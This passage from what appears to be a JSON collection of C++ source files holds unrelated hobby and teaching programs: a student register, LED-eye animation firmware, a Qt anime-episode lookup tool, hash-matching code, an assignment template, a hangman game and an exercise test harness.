<< registru[ordHighest].medie << '\\n';\n    \n}\n\nvoid highestAbsente(const std::vector<Student> & registru)\n{\n    int iterator, ordHighest, highest;\n    highest = 0;\n      for ( iterator = 0; iterator < registru.size(); iterator++)\n    {\n        if (registru[iterator].numAbsente > highest)\n        {\n            highest = registru[iterator].numAbsente;\n            ordHighest = iterator;\n        }\n        \n    }\n     studentName(registru,ordHighest);\n    std::cout << \"Are cele mai multe absente : \" << registru[ordHighest].numAbsente << '\\n';\n}\nvoid mainMenu()\n{\n    std::cout << \"Apasa 1 pentru a adauga un student now \\n\";\n    std::cout << \"Apasa 2 pentru a arata lista de studenti \\n\";\n    std::cout << \"Apasa 3 pentru a adauga o pereche noua \\n\";\n    std::cout << \"Apasa 4 pentru a gasi studentul cu cea mai mare medie \\n\";\n    std::cout << \"Apasa 5 pentru a gasi studentul cu cele mai multe absente \\n\";\n    std::cout << \"Apasa 6 pentru a intra in meniul unui anumit student (cu id-ul) \\n \";\n    std::cout << \"Apasa 0 pentru a iesi din program \\n \\n\";\n}\nvoid studentMenu()\n{\n    std::cout << \"Apasa 1 pentru a citi numele studentului \\n\";\n    std::cout << \"Apasa 2 pentru a print",
    "#include \"ledeyes.h\"\n\nLedEyes::LedEyes()\n{\n    // \u521d\u59cb\u5316\u7c7b\u65f6\uff0c\u7ed9leds_l\u548cleds_r\u8d4b\u521d\u59cb\u503c\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n        leds_l[i] = CRGB::Black;\n        leds_r[i] = CRGB::Black;\n        leds_color_l[i] = CRGB::Black;\n        leds_color_r[i] = CRGB::Black;\n        leds_colortrans_l[i] = CRGB::Black;\n        leds_colortrans_r[i] = CRGB::Black;\n        leds_britrans_l[i] = CRGB::Black;\n        leds_britrans_r[i] = CRGB::Black;\n    }\n\n    FastLED.addLeds<WS2812B, LED_L_PIN, GRB>(leds_l, NUM_LEDS);\n    FastLED.setBrightness(FastLED_BRIGNTNESS_INIT);\n    FastLED.addLeds<WS2812B, LED_R_PIN, GRB>(leds_r, NUM_LEDS);\n    FastLED.setBrightness(FastLED_BRIGNTNESS_INIT);\n}\n\nLedEyes::~LedEyes()\n{\n}\n\n/// @brief \u521d\u59cb\u5316LED\n/// @param \u65e0\n/// @return \u65e0\n/// @todo\nvoid LedEyes::init()\n{\n\n    led_CRGBcolor_current = color24_1;\n    led_brightness = LED_BRIGNTNESS_INIT;\n    timer_ms = 0;\n    flag_eyes_blink = true;\n    setLeds2SingleColor(led_CRGBcolor_current);\n}\n\nvoid LedEyes::update()\n{\n    setLeds2SingleColor(led_CRGBcolor_current);\n\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n        leds_colortrans_l[i] = leds_color_l[i];\n        leds_colortrans_r[i] = leds_color_r[i];\n    }\n\n    setLedsBrightness();\n\n    for (int led_index = 0; led_index < NUM_LEDS; led_index++)\n    {\n        leds_l[led_index] = leds_britrans_l[led_index];\n        leds_r[led_index] = leds_britrans_r[led_index];\n    }\n\n    FastLED.show();\n}\n\nvoid LedEyes::setLeds2SingleColor(CRGB color)\n{\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n        leds_color_l[i] = color;\n        leds_color_r[i] = color;\n    }\n}\n\nvoid LedEyes::setLedsBrightness()\n{\n    // \u6574\u4f53\u8c03\u6574\u4eae\u5ea6\n    for (int i = 0; i < NUM_LEDS; i++)\n    {\n        leds_britrans_l[i] = briScale(leds_colortrans_l[i], led_brightness);\n        leds_britrans_r[i] = briScale(leds_colortrans_r[i], led_brightness);\n    }\n\n    // \u8bbe\u7f6e\u4eae\u5ea6\u4e0a\u4e0b\u6e10\u53d8\u6548\u679c\n    if (flag_eyes_bri_gradient)\n    {\n        float bri_gradient_l[NUM_LEDS] = {\n            0.0, 0.0, 0.0, 0.0, 0.05, 0.1, 0.25, 0.5, 0.8, 1.0, 1.0, 0.8, 0.5, 0.25, 0.1, 0.05, 0.0, 0.0, 0.0, 0.0\n        };\n        float bri_gradient_r[NUM_LEDS] = {\n            0.0, 0.0, 0.0, 0.0, 0.05, 0.1, 0.25, 0.5, 0.8, 1.0, 1.0, 0.8, 0.5, 0.25, 0.1, 0.05, 0.00, 0.0, 0.0, 0.0\n        };\n        // \u4eae\u5ea6\u6e10\u53d8\n        for (int i = 0; i < NUM_LEDS; i++)\n        {\n            leds_britrans_l[i] = briScale(leds_britrans_l[i], bri_gradient_l[i]);\n            leds_britrans_r[i] = briScale(leds_britrans_r[i], bri_gradient_r[i]);\n        }\n    }\n}\n\n\nvoid taskEyesBlink(void *pvParameters)\n{\n    LedEyes &ledEyes = *(LedEyes *)pvParameters;\n    while (1)\n    {\n        if (ledEyes.flag_eyes_blink)\n        {\n            // \u95ed\u773c\u775b\n            for (int i = 0; i < NUM_LEDS / 2; i++)\n            {\n                for (int led_index = 0; led_index < NUM_LEDS; led_index++)\n                {\n                    if (led_index < i || led_index >= NUM_LEDS - i)\n                    {\n                        ledEyes.leds_l[led_index] = CRGB::Black;\n                        ledEyes.leds_r[led_index] = CRGB::Black;\n                    }\n                    else\n                    {\n                        ledEyes.leds_l[led_index] = ledEyes.leds_britrans_l[led_index];\n                        ledEyes.leds_r[led_index] = ledEyes.leds_britrans_r[led_index];\n                    }\n                }\n                FastLED.show();\n                vTaskDelay(ledEyes.eyes_blink_delay_ms / portTICK_PERIOD_MS);\n            }\n\n            // \u7741\u773c\u775b\n            for (int i = NUM_LEDS / 2 - 1; i >= 0; i--)\n            {\n                for (int led_index = 0; led_index < NUM_LEDS; led_index++)\n                {\n                    if (led_index < i || led_index >= NUM_LEDS - i)\n                    {\n                        ledEyes.leds_l[led_index] = CRGB::Black;\n                        ledEyes.leds_r[led_index] = CRGB::Black;\n                    }\n                    else\n                    {\n                        ledEyes.leds_l[led_index] = ledEyes.leds_britrans_l[led_index];\n                        ledEyes.leds_r[led_index] = ledEyes.leds_britrans_r[led_index];\n                    }\n                }\n                FastLED.show();\n                vTaskDelay(ledEyes.eyes_blink_delay_ms / portTICK_PERIOD_MS);\n            }\n            // Serial.println(\"task Eyes Blink\");\n            vTaskDelay(ledEyes.eyes_blink_palse_ms / portTICK_PERIOD_MS);\n        }\n        else\n        {\n            for (int led_index = 0; led_index < NUM_LEDS; led_index++)\n            {\n                ledEyes.leds_l[led_index] = ledEyes.leds_britrans_l[led_index];\n                ledEyes.leds_r[led_index] = ledEyes.leds_britrans_r[led_index];\n            }\n            FastLED.show();\n            vTaskDelay(ledEyes.eyes_blink_palse_ms / portTICK_PERIOD_MS);\n        }\n    }\n}\n\nvoid taskEyesUpdate(void *pvParameters)\n{\n    LedEyes &ledEyes = *(LedEyes *)pvParameters;\n    while (1)\n    {\n        ledEyes.update();\n        vTaskDelay(100 / portTICK_PERIOD_MS);\n    }\n}\n\nCRGB ",
    "#include \"identifywindow.h\"\n#include \"ui_identifywindow.h\"\n\n#include <QFileDialog>\n#include <QMessageBox>\n#include <QNetworkReply>\n#include <QNetworkAccessManager>\n#include <QJsonDocument>\n#include <QJsonObject>\n#include <QJsonArray>\n#include <QDesktopServices>\n#include <QSettings>\n\nidentifywindow::identifywindow(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::identifywindow)\n{\n    ui->setupUi(this);\n    setWindowFlags(Qt::CustomizeWindowHint|Qt::FramelessWindowHint);\n    ui->progressBar->setVisible(0);\n}\n\nidentifywindow::~identifywindow()\n{\n    delete ui;\n}\nQString fileName;\nQString fileNameOnly;\nint episodeId;\nQList<int> Danmu_time;\nQStringList Danmu_msg;\n\n\n/*\u5220\u9664\u6587\u4ef6\u540d\u5185\u7684\u591a\u4f59\u4fe1\u606f*/\nQString removeNonNumericBracketedContent(QString input) {\n    // \u5339\u914d\u4e2d\u62ec\u53f7\u5305\u88f9\u7684\u5185\u5bb9\uff0c\u53ea\u8981\u62ec\u53f7\u5185\u5305\u542b\u975e\u7eaf\u6570\u5b57\u7684\u5b57\u7b26\u5c31\u5220\u9664\n    QRegularExpression re(\"\\\\[[^\\\\[\\\\]]*[^\\\\d\\\\[\\\\]][^\\\\[\\\\]]*\\\\]\");\n    return input.replace(re,\"\");\n}\n/*Post\u8bf7\u6c42*/\nQString identifywindow::postUrl(const QString &input)\n{\n    /*\u4f7f\u7528dandanplay\u8fdb\u884c\u522e\u522e\u4e50*/\n    m_manager = new QNetworkAccessManager(this);//\u65b0\u5efaQNetworkAccessManager\u5bf9\u8c61\n    QString read;\n    QEventLoop loop;\n    QNetworkReply *reply = m_manager->get(QNetworkRequest(QUrl(input)));\n    connect(reply, SIGNAL(finished()), &loop, SLOT(quit()));\n    loop.exec();\n    read = reply->readAll();\n    reply->deleteLater();       //\u8bb0\u5f97\u91ca\u653e\u5185\u5b58\n    return read;\n}\n/*\u79d2\u7684\u8f6c\u6362*/\nQString secondsToTimeString(double seconds) {\n\n    // \u63d0\u53d6\u6574\u79d2\u90e8\u5206\n    int totalSeconds = static_cast<int>(seconds);\n    // \u63d0\u53d6\u6beb\u79d2\u90e8\u5206\uff08\u6ce8\u610f\uff0c\u8fd9\u91cc\u8fdb\u884c\u4e86\u653e\u5927\u4ee5\u5f97\u5230\u6574\u6570\u6beb\u79d2\uff09\n    int milliseconds = static_cast<int>((seconds - totalSeconds) * 1000);\n\n    // \u8ba1\u7b97\u5c0f\u65f6\u3001\u5206\u949f\u548c\u5269\u4f59\u7684\u79d2\n    int hours = totalSeconds / 3600;\n    int minutes = (totalSeconds % 3600) / 60;\n    int secs = totalSeconds % 60;\n\n    // \u4f7f\u7528QString\u8fdb\u884c\u683c\u5f0f\u5316\n    QString timeStr = QString(\"%1:%2:%3:%4\")\n                          .arg(hours, 2, 10, QChar('0'))\n                          .arg(minutes, 2, 10, QChar('0'))\n                          .arg(secs, 2, 10, QChar('0'))\n                          .arg(milliseconds, 2, 10, QChar('0'));\n\n\n    return timeStr;\n}\n/*\u9009\u62e9\u6587\u4ef6*/\nvoid identifywindow::on_pushButton_select_file_clicked()\n{\n    /*\u6587\u4ef6\u83b7\u53d6*/\n    fileName = QFileDialog::getOpenFileName(this,\n                                            tr(\"\u9009\u62e9\u89c6\u9891\u6587\u4ef6\"),\n                                            \"\",\n                                            tr(\"All Files (*.*)\"));\n    /*\u9009\u62e9\u6587\u4ef6*/\n    fileNameOnly = QFileInfo(fileName).baseName();\n    /*\u6587\u4ef6\u540d\u5904\u7406*/\n    fileNameOnly = removeNonNumericBracketedContent(fileNameOnly);\n    fileNameOnly.replace(\"[\",\"\").replace(\"]\",\"\");\n    fileNameOnly = fileNameOnly.trimmed();\n    ui->label_file_source_name->setText(fileName);\n    ui->lineEdit_file_name->setText(fileNameOnly);\n    if(!fileNameOnly.isEmpty())\n    {\n        ui->lineEdit_file_name->setEnabled(1);\n        ui->pushButton_next->setEnabled(1);\n    }\n    else\n    {\n        ui->lineEdit_file_name->setEnabled(0);\n        ui->pushButton_next->setEnabled(0);\n    }\n}\n/*\u624b\u52a8\u4fee\u6539\u540d\u8bcd*/\nvoid identifywindow::on_lineEdit_file_name_textChanged(const QString &arg1)\n{\n    fileNameOnly = arg1;\n}\n/*\u4e0b\u4e00\u6b65*/\nvoid identifywindow::on_pushButton_next_clicked()\n{\n    loading(true);\n    ui->pushButton_next->setEnabled(0);\n    ui->pushButton_back->setEnabled(1);\n    switch (ui->stackedWidget->currentIndex()) {\n    case 0:\n    {\n        ui->label_ep_id->setText(\"Loading...\");\n        ui->label_ep_name->setText(\"Loading...\");\n        ui->label_anime_name->setText(\"Loading...\");\n        ui->stackedWidget->setCurrentIndex(1);\n        /*\u83b7\u53d6\u756a\u5267id*/\n        QString fileNameEp = postUrl(\"https://api.dandanplay.net/api/v2/search/episodes?anime=\" +fileNameOnly);\n        /*\u63d0\u53d6\u756a\u5267id*/\n        // \u5c06JSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aQJsonDocument\n        QJsonDocument doc = QJsonDocument::fromJson(fileNameEp.toUtf8());\n        // \u8f6c\u6362\u4e3aQJsonObject\n        QJsonObject obj = doc.object();\n        // \u4eceQJsonObject\u4e2d\u83b7\u53d6\"animes\"\u6570\u7ec4\n        QJsonArray animesArray = obj[\"animes\"].toArray();\n        // \u904d\u5386animes\u6570\u7ec4\n        bool find_anime = false;\n        for (const QJsonValue &animeValue : animesArray)\n        {\n            QJsonObject animeObj = animeValue.toObject();\n            ui->label_anime_name->setText(animeObj[\"animeTitle\"].toString());\n            // \u4ece\u6bcf\u4e2aanime\u5bf9\u8c61\u4e2d\u83b7\u53d6\"episodes\"\u6570\u7ec4\n            QJsonArray episodesArray = animeObj[\"episodes\"].toArray();\n            // \u904d\u5386episodes\u6570\u7ec4\n            for (const QJsonValue &episodeValue : episodesArray)\n            {\n                QJsonObject episodeObj = episodeValue.toObject();\n                // \u63d0\u53d6episodeId\n                episodeId = episodeObj[\"episodeId\"].toInt();\n                // \u6253\u5370\u7ed3\u679c\n                ui->label_ep_id->setText(QString::number(episodeId));\n                ui->label_ep_name->setText(episodeObj[\"episodeTitle\"].toString());\n                ui->pushButton_next->setEnabled(1);\n                ui->pushButton_back->setEnabled(1);\n                find_anime = true;\n                loading(false);\n            }\n        }\n        if(!find_anime)\n        {\n            ui->label_anime_name->setText(\"\u672a\u627e\u5230\");\n            ui->label_",
    "// $Id$\n\n/** hashlist.cpp\n * Implements a list of hashes for local database, searching, etc.\n * Currently done with a map; could be done with an unordered set.\n * Contains the logic for performing the audit.\n * Formerly this code was in audit.cpp and match.cpp.\n */\n\n#include \"main.h\"\n#include <new>\n#include <iostream>\n\n/// Add a fi to the hash list.\n///\n/// Be sure that the hash is all lower case, because that's what we\n/// use internally.\nvoid hashlist::hashmap::add_file(file_data_t *fi,int alg_num)\n{\n    if (fi->hash_hex[alg_num].size())\n    {\n      std::string hexhash = fi->hash_hex[alg_num];\n      for (std::string::iterator it = hexhash.begin();it!=hexhash.end();it++)\n      {\n\tif (isupper(*it))\n\t  *it = tolower(*it);\n      }\n      insert(std::pair<std::string,file_data_t *>(hexhash,fi));\n    }\n}\n\n\n/**\n * Adds a file_data_t pointer to the hashlist.\n * Does not copy the object.\n * Object will be modified if there is a match.\n */\nvoid hashlist::add_fdt(file_data_t *fi)\n{\n    push_back(fi);\t\t\t// retain our copy\n    for(int i=0;i<NUM_ALGORITHMS;i++){\t// and add for each algorithm\n\thashmaps[i].add_file(fi,i); // and point to the back\n    };\n}\n\n/**\n * search for a hash with an (optional) given filename.\n * Return the first hash that matches the filename.\n * If nothing matches the filename, return the first hash that matches.\n * If a match is found, set file_number in the hash that is found.\n * Not sure I like modifying the store, but it's okay for now.\n */\nfile_data_t *hashlist::find_hash(hashid_t alg,\n\t\t\t\t const std::string &hash_hex,\n\t\t\t\t const std::string &file_name,\n\t\t\t\t uint64_t file_number)\n{\n    if(opt_debug>2)\n      std::cerr << \"find_hash alg=\" << alg << \" hash_hex=\" << hash_hex <<\n\t\" fn=\" << file_name << \" file_number=\" << file_number;\n    std::pair<hashmap::iterator,hashmap::iterator> match;\n    match = this->hashmaps[alg].equal_range(hash_hex);\n    if (match.first==match.second)\n    {\n      if (opt_debug>2)\n\tstd::cerr << \" RETURNS 0\\n\";\n      return 0; // nothing found\n    }\n\n    for (hashmap::iterator it = match.first; it!=match.second; ++it)\n    {\n      if ((*it).second->file_name == file_name)\n      {\n\tif (file_number)\n\t  (*it).second->matched_file_number = file_number;\n\tif (opt_debug)\n\t  std::cerr << \" RETURNS EXACT MATCH \" << file_number << \"\\n\";\n\treturn (*it).second;\n      }\n    }\n\n    // No exact matches; return the first match\n    if (file_number)\n      (*match.first).second->matched_file_number = file_number;\n    if (opt_debug)\n      std::cerr << \" RETURNS FIRST MATCH \" << file_number << \"\\n\";\n    return (*match.first).second;\n}\n\n\n///\n/// Search for the provided fdt in the hashlist and return the status of the match.\n/// Match on name if possible; otherwise match on just the hash codes.\n///\nhashlist::searchstatus_t hashlist::search(const file_data_hasher_t *fdht,\n\t\t\t\t\t  file_data_t ** matched_,\n\t\t\t\t\t  bool case_sensitive)\n{\n  // Iterate through each of the hashes in the haslist until we find a match.\n  for (int alg = 0 ; alg < NUM_ALGORITHMS ; ++alg)\n  {\n    // Only search hash functions that are in use and hashes that are in the fdt\n    if (hashes[alg].inuse==0 || fdht->hash_hex[alg].size()==0)\n    {\n      continue;\n    }\n\n    // Find the best match using find_hash\n    file_data_t *matched = find_hash((hashid_t)alg,\n\t\t\t\t     fdht->hash_hex[alg],\n\t\t\t\t     fdht->file_name,\n\t\t\t\t     fdht->file_number);\n\n    if (not matched)\n    {\n      // No match\n      continue;\n    }\n\n    if (matched_)\n      *matched_ = matched; // note the match\n\n    // Verify that all of the other hash functions for *it match fdt as well,\n    // but only for the cases when we have a hash for both the master file\n    // and the target file.\n    for (int j=0 ; j<NUM_ALGORITHMS ; j++)\n    {\n      if (hashes[j].inuse and\n\t  j != alg and\n\t  fdht->hash_hex[j].size() and\n\t  matched->hash_hex[j].size())\n      {\n\tif (fdht->hash_hex[j] != matched->hash_hex[j])\n\t{\n\t  // We have found a hash collision for one algorithm, but not all\n\t  // of them. For example, MD5(A) == MD5(B), but SHA1(A) != SHA1(B).\n\t  // See http://www.win.tue.nl/hashclash/ for a program to create these.\n\t  return status_partial_match;\n\t}\n      }\n    }\n\n    // If we got here we matched on all of the hashes.\n    // Which is to be expected.\n    // Check to see if the sizes are the same.\n    if (fdht->file_bytes != matched->file_bytes)\n    {\n      // Amazing. We found two files that have the same hash but different\n      // file sizes. This has never happened before in the history of the world.\n      // Call the newspapers!\n      return status_file_size_mismatch;\n    }\n\n    // See if the hashes are the same but the name changed.\n    if (case_sensitive)\n    {\n      if (fdht->file_name != matched->file_name)\n\treturn status_file_name_mismatch;\n    }\n    else\n    {\n      if (strcasecmp(fdht->file_name.c_str(), matched->file_name.c_str()))\n\treturn status_file_name_mismatch;\n    }\n\n    // If we get here, then all of the hash matches for all of the\n    // algorithms have be",
    "/** @file assg07-library.cpp\n *\n * @brief Implementation file for Assignment 07: Static Variables, Default Parameters and Function Overloading\n *\n * @author Derek Harter\n * @note   class: COSC 1437, Fall 2024\n * @note   ide  : VS Code 1.92.2\n * @date   September 15, 2024\n *\n * Assignment implementation file.  All of the actual implementation of\n * functions for tasks goes into an implementation file with a .cpp extension.\n * The prototypes of any functions that are used by others should be put into\n * the .hpp header file.\n */\n#include <string>\nusing namespace std;\n\n\n/** @brief return the next Fibonacci number\n *\n * The Fibonacci sequence is defined usually as\n *\n * 0, 1, 1, 2, 3, 5, 8, 13, 21, ...\n *\n * Where\n *\n *   fib_n = fib_(n-1) + fib_(n-2)\n *   fib_0 = 0\n *   fib_1 = 1\n *\n * e.g. the next Fibonacci number in the sequence is defined as the\n * sum of the previous two numbers in the sequence, with 0 and 1 being\n * the 0th and 1st term by definition of the sequence.\n * \n * This funciton, when called, returns the next number in the Fibonacci\n * sequence.  We remember our previous two numbers generated (using\n * static variables).  A default parameter can be overridden to reset\n * the sequence, to continue returning number starting at fib_1.\n *\n * @param resetSequence When false we just generate and return the next\n *    Fibonacci number in the sequence.  When true we reset to the\n *    start of the sequence and return fib_1 (the 1st value in the\n *    sequence).\n *\n * @returns int Remembers and on repeated calls generates and returns\n *    the next Fibonacci number in the sequence.  Can be called with\n *    the reset flag parameter to reset and begin generating from the start\n *    of the sequence again.\n */\n// your implementation of task 1 nextFibonacciNumber() goes here\n\n\n/** @brief swap two given integer values in memory\n *\n * Given two integer values, swap their locations\n * in memory.  We can do this because the parameters\n * are passed by reference, so when we modify them\n * in this function, we are modifying the original\n * values passed to us.\n *\n * @param a A reference to a value in memory to be swapped with\n *    some other value.\n * @param b A second reference to a value in memory to be swapped.\n *\n * @returns void This is a void function.  Our work is returned\n *    implicitly by swapping the values in the referenced memory\n *    locations a and b.\n */\nvoid swap(int& a, int& b)\n{\n  // need to save a value temporarily so we can move things\n  // around successfully.\n  int temp = a;\n  a = b;\n  b = temp;\n}\n\n\n/** @brief sort three values in ascending order\n *\n * Given three integer values, passed in by reference,\n * cause the three values to be sorted in the\n * variables with the smallest value in the first\n * parameter a, the largest in the last c, and the\n * in between one in b.\n *\n * @param a A reference to a value in memory to compared and sorted.\n * @param b A reference to a value in memory to compared and sorted.\n * @param c A reference to a value in memory to compared and sorted.\n *\n * @returns void This is a void function.  Our work is returned\n *    implicitly by comparing and sorting the 3 values into\n *    ascending order, smallest in a, largest in c and in between\n *    value in b.\n */\nvoid threeSort(int& a, int& b, int& c)\n{\n  // swap a, b if out of order, guarantees larger of the two is now in b\n  if (a > b)\n  {\n    swap(a, b);\n  }\n\n  // swap b, c if out of order, guarantees that largest values has been\n  // now bubbled to c\n  if (b > c)\n  {\n    swap(b, c);\n  }\n\n  // it is still possible after this \"bubble pass\" that a and b are out of\n  // order, so check and swap them if needed\n  if (a > b)\n  {\n    swap(a, b);\n  }\n}\n",
    "#include <iostream>//Biblioteca para entrada e sa\u00edda de dados\n#include <math.h>//Biblioteca para operac\u00f5es matem\u00e1ticas\n#include <stdlib.h>//Biblioteca que possui a fun\u00e7\u00e3o de limpar o console\n#include <cstdlib>//Biblioteca que possui a fun\u00e7\u00e3o de gerar um n\u00famero aleat\u00f3rio\n#include <ctime>//Biblioteca que pode pegar o hor\u00e1rio atual da m\u00e1quina\n\nusing namespace std;\n\n//Macro que cont\u00e9m a fun\u00e7\u00e3o de limpar o console. Mais detalhes na fun\u00e7\u00e3o main()\n#define clear (void)system(\"clear||cls\");\n#define space cout << endl;\n\n\nchar wordBank[10][5];//Banco de palavras que cont\u00e9m as palavras que ser\u00e3o utilizadas no jogo\n\nvoid setWordBank(){\n  wordBank[0][0] = 'p';\n  wordBank[0][1] = 'o';\n  wordBank[0][2] = 'd';\n  wordBank[0][3] = 'e';\n  wordBank[0][4] = 'r';\n\n  wordBank[1][0] = 'n';\n  wordBank[1][1] = 'o';\n  wordBank[1][2] = 'b';\n  wordBank[1][3] = 'r';\n  wordBank[1][4] = 'e';\n\n  wordBank[2][0] = 's';\n  wordBank[2][1] = 'o';\n  wordBank[2][2] = 'n';\n  wordBank[2][3] = 'h';\n  wordBank[2][4] = 'o';\n\n  wordBank[3][0] = 'g';\n  wordBank[3][1] = 'e';\n  wordBank[3][2] = 'n';\n  wordBank[3][3] = 'r';\n  wordBank[3][4] = 'o';\n\n  wordBank[4][0] = 'c';\n  wordBank[4][1] = 'l';\n  wordBank[4][2] = 'a';\n  wordBank[4][3] = 'v';\n  wordBank[4][4] = 'a';\n\n  wordBank[5][0] = 'g';\n  wordBank[5][1] = 't';\n  wordBank[5][2] = 'a';\n  wordBank[5][3] = 'v';\n  wordBank[5][4] = 'i';\n\n  wordBank[6][0] = 'p';\n  wordBank[6][1] = 'i';\n  wordBank[6][2] = 'z';\n  wordBank[6][3] = 'z';\n  wordBank[6][4] = 'a';\n\n  wordBank[7][0] = 'a';\n  wordBank[7][1] = 'r';\n  wordBank[7][2] = 'e';\n  wordBank[7][3] = 'i';\n  wordBank[7][4] = 'a';\n\n  wordBank[8][0] = 'n';\n  wordBank[8][1] = 'a';\n  wordBank[8][2] = 'r';\n  wordBank[8][3] = 'i';\n  wordBank[8][4] = 'z';\n\n  wordBank[9][0] = 'c';\n  wordBank[9][1] = 'o';\n  wordBank[9][2] = 'b';\n  wordBank[9][3] = 'r';\n  wordBank[9][4] = 'a';\n}\n\n//Fun\u00e7\u00e3o que gera uma descri\u00e7\u00e3o da palavra sorteada de acordo com sua posi\u00e7\u00e3o na matriz.\nstring setWordDescription(int x){\n  string wordDescription;\n\n  switch(x){\n    case 0:\n      wordDescription = \"Verbo que significa a capacidade de fazer algo ou ter influencia sobre algo ou alguem.\";\n      break;\n\n    case 1:\n      wordDescription = \"Classe social da idade media.\";\n      break;\n\n    case 2:\n      wordDescription = \"Evento que acontece em nosso cerebro quando estamos em sono profundo.\";\n      break;\n\n    case 3:\n      wordDescription = \"Pessoa cujo parentesco em uma familia seria marido da filha da sogra/sogro.\";\n      break;\n\n    case 4:\n      wordDescription = \"Objeto usado na pre-historia para defesa ou obtencao de alimentos (tambem pode ser entendido como pedaco de madeira).\";\n      break;\n        \n    case 5:\n      wordDescription = \"Um dos melhores jogos de todos os tempos de mundo aberto que sera lancado em breve; que possui umas das franquias mais famosas.\";\n      break;\n\n    case 6:\n      wordDescription = \"Alimento redondo que tem origem italiana.\";\n      break;\n\n    case 7:\n      wordDescription = \"Encontrado em abundancia em praias.\";\n      break;\n\n    case 8:\n      wordDescription = \"Responsavel por um dos 5 sentidos sensoriais do corpo humano.\";\n      break;\n\n    case 9:\n      wordDescription = \"Reptil.\";\n      break;\n\n    default:\n      wordDescription = \"Erro desconhecido: a palavra n\u00e3o foi gerada de maneira correta\";\n      break;\n  }\n\n  return wordDescription;\n}\n\n//Fun\u00e7\u00e3o que gera um n\u00famero aleat\u00f3rio entre 0 e o n\u00famero fornecido no par\u00e2metro\nint randomInt(int x){\n  srand(time(nullptr));\n  int result;\n\n  result = rand() % x;\n\n  return result;\n}\n\n//Faz o desenho de um boneco e a forca\nvoid drawGame(int x){\n  char draw[5][6];\n\n  draw[0][0] = ' ';\n  draw[0][1] = '_';\n  draw[0][2] = '_';\n  draw[0][3] = '_';\n  draw[0][4] = '_';\n  draw[0][5] = '_';\n\n  draw[1][0] = '|';\n  draw[1][1] = ' ';\n  draw[1][2] = ' ';\n  draw[1][3] = ' ';\n  draw[1][4] = ' ';\n  draw[1][5] = ' ';\n\n  draw[2][0] = '|';\n  draw[2][1] = ' ';\n  draw[2][2] = ' ';\n  draw[2][3] = ' ';\n  draw[2][4] = ' ';\n  draw[2][5] = ' ';\n\n  draw[3][0] = '|';\n  draw[3][1] = ' ';\n  draw[3][2] = ' ';\n  draw[3][3] = ' ';\n  draw[3][4] = ' ';\n  draw[3][5] = ' ';\n\n  draw[4][0] = '|';\n  draw[4][1] = '_';\n  draw[4][2] = '_';\n  draw[4][3] = '_';\n  draw[4][4] = '_';\n  draw[4][5] = '_';\n\n  switch(x){\n    case 0:\n      break;\n\n    case 1:\n      draw[1][4] = 'O';\n      break;\n\n    case 2:\n      draw[1][4] = 'O';\n      draw[2][4] = '8';\n      break;\n\n    case 3:\n      draw[1][4] = 'O';\n      draw[2][4] = '8';\n      draw[3][3] = '/';\n      break;\n\n    case 4:\n      draw[1][4] = 'O';\n      draw[2][4] = '8';\n      draw[3][3] = '/';\n      draw[3][5] = ')';\n      break;\n\n    case 5:\n      draw[1][4] = 'O';\n      draw[2][4] = '8';\n      draw[3][3] = '/';\n      draw[3][5] = ')';\n      draw[2][3] = '/';\n      break;\n\n    case 6:\n      draw[1][4] = 'O';\n      draw[2][4] = '8';\n      draw[3][3] = '/';\n      draw[3][5] = ')';\n      draw[2][3] = '/';\n      draw[1][5] = '/';\n      break;\n\n    default:\n      break;\n  }\n\n\n\n  //Desenhar a forma na tela\n  for(int i = 0; ",
    "#include \"Exercises/Universe.h\"\n\n#include <string>\n#include <vector>\n#include <iostream>\n#include <sstream>\n#include <fstream>\n\nusing namespace std;\n\nvoid Message(string channel, string msg) {\n    stringstream ss(msg);\n    string line;\n    while (getline(ss, line, '\\n')) {\n        cout << \"TECHIO> message --channel \\\"\" << channel << \"\\\" \\\"\" << line << \"\\\"\" << endl;\n    }\n}\n\nvoid Success(bool success) {\n    cout << \"TECHIO> success \" << (success ? \"true\" : \"false\") << endl;\n}\n\n// check if a string exists in a text file\nbool ExistsInFile(string str, string filename) {\n    ifstream file(filename);\n    string line;\n\n    while (getline(file, line)) {\n        if (line.find(str) != string::npos ) {\n            return true;\n        }\n    }\n    \n    return false;\n}\n\nvoid AssertEquals(int expected, int found, string message) {\n    if(expected != found) {\n        ostringstream error;\n        error << message << \" Expected: \" << expected << \", Found: \" << found  << endl;\n        throw logic_error(error.str());\n    }\n}\n\nint main() {\n    try {\n        vector<int> galaxy1 {2, 3};\n        AssertEquals(5, Universe::CountAllStars(galaxy1), \"Running Universe::CountAllStars(2, 3)...\");\n\n        vector<int> galaxy2 {9, -3};\n        AssertEquals(6, Universe::CountAllStars(galaxy2), \"Running Universe::CountAllStars(9, -3)...\");\n        Success(true);\n\n        if (ExistsInFile(\"accumulate\", \"src/Exercises/Universe.cpp\")) {\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \"* \u25cf \u00b8 .\u3000\u00b8. :\u00b0 \u263e \u00b0 \u3000\u00b8. \u25cf \u00b8 .\u3000\u3000\u00b8.\u3000:. \u2022 \");\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \"           \u3000\u2605 \u00b0  \u2606 \u00b8. \u00b8 \u3000\u2605\u3000 :.\u3000 .   \");\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \"__.-._     \u00b0 . .\u3000\u3000\u3000\u3000.\u3000\u263e \u00b0 \u3000. *   \u00b8 .\");\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \"'-._\\\\7'      .\u3000\u3000\u00b0 \u263e  \u00b0 \u3000\u00b8.\u2606  \u25cf .\u3000\u3000\u3000\");\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \" /'.-c    \u3000   * \u25cf  \u00b8.\u3000\u3000\u00b0     \u00b0 \u3000\u00b8.    \");\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \" |  /T      \u3000\u3000\u00b0     \u00b0 \u3000\u00b8.     \u00b8 .\u3000\u3000  \");\n            Message(\"My personal Yoda, you are. \ud83d\ude4f\", \"_)_/LI\");\n        } else {\n            Message(\"Kudos \ud83c\udf1f\", \"Did you know that you can use the accumulate method to sum up a vector? Try it!\");\n            Message(\"Kudos \ud83c\udf1f\", \" \");\n            Message(\"Kudos \ud83c\udf1f\", \"#include <numeric>\");\n            Message(\"Kudos \ud83c\udf1f\", \" \");\n            Message(\"Kudos 